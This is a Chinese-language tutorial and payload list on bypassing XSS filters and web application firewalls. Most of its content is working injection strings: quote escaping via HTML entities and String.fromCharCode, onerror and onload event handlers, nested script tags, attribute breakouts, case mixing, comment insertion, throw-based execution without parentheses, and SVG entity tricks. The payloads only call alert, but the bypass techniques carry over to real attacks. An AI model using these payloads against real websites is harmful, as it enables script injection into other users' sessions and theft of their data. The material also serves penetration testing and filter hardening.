## XSS绕过技巧 ##
### 前言 ###
XSS是Web应用程序中常见的漏洞之一，网站管理员可以通过用户输入过滤、根据上下文转换输出数据、正确使用DOM、强制执行跨源资源共享（CORS）策略以及其他的安全策略来规避XSS漏洞。尽管现在有很多预防XSS攻击的技术，但Web应用程序防火墙（WAF）或自定义数据过滤器是目前使用比较广泛的安全保护技术了，很多厂商都会利用这些技术来抵御新型的XSS攻击向量

有些时候，通用的绕过技巧并不可行，这个时候我们就得观察缺陷点的周围环境，想想其它办法咯。“猥琐绕过”与通用绕过不 同的是，它通用性小，往往只是特例。

####1.单引号过滤绕过 ####
在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通
过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：

     <INPUT type="text" value='\'><SCRIPT>alert(\"XSS\")</SCRIPT>'>
有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html
的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用<>表示大于和小于，
因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。

    1	2	3	4
    &#34;	&quot;	“	双引号	
    &#38;	&amp;	&	&符号	
    &#60;	&lt;	<	小于号	
    &#62;	&gt;	>	大于号
使用`&quot`;或者`&#34`;
来代替我们的双引号，有时候可以绕过过滤

**例子:**

    <script>alert("XSS")</script>
    <script>alert(&quot;XSS&quot;)</script>
    <script>alert(&#38;XSS&#38;)</script>
如果这都被过滤了。那我们可以使用 JavaScript 的 fromCharCode 函数，这个函数把指定的 Unicode值转换成字符串
   
**例子**

    <script>alert("XSS")</script>
    <script>alert(String.fromCharCode(88,83,83))</script>
    
#### 2.` <SCRIPT>`过滤绕过 ####
有些过滤器会过滤到`<script>`标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。

    <BODY onload="alert('XSS')">

在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。

    <IMG SRC="" onerror="alert('XSS')">
    <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用`<script>`
标签哦。

如果是把`<script>`和`</script>`标签过滤掉，那么可以用

    <scr<script>ipt>alert(1)</scr<script>ipt>

#### 3.(Input)标签属性绕过 ####
    <INPUT type="text" value='<SCRIPT>alert("XSS")</SCRIPT>'>
**闭合`<input>`**

    '><SCRIPT>alert("XSS")</SCRIPT>
现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。

    '><SCRIPT>alert("XSS")</SCRIPT><xss a='
所有的输入就会变成这样：
    
    <INPUT type="text" value=''><SCRIPT>alert("XSS")</SCRIPT><xss a=''>
Javascript 代码就注入了。`<xss a=”>`这个没什么意义，你可以自己改，但是符合 html 的标准，
页面不会出错。

#### 4.大小写混用绕过 ####
    <iMgSRC = "JavaScript:alert(0);">

不使用引号或者构造全角字符也能扰乱过滤规则

还有像CSS中/**/会被浏览器忽略，\和\0同样或被浏览器忽略，同样可以用来绕过：

    <img src ="java/*javascript:alert(‘xss‘)*/script:alert(1);">
#### 5.`magic_quotes_gpc`绕过####
    <script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script> 
#### 6.分号引号过滤绕过 ####
    
    <IMG SRC=javascript:alert('XSS')>    

####  7.括号被过滤绕过 ####
当括号被过滤的时候可以使用throw来绕过

    <a onmouseover="javascript:window.onerror=alert;throw 1>
    <img src=x onerror="javascript:window.onerror=alert;throw 1">
以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：
    
    <body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
#### 8.= ( ) ; :被过滤时绕过 ####
    <svg><script>alert&#40/1/&#41</script> // 通杀所有浏览器
opera中可以不闭合

    <svg><script>alert&#40 1&#41 // Opera可查

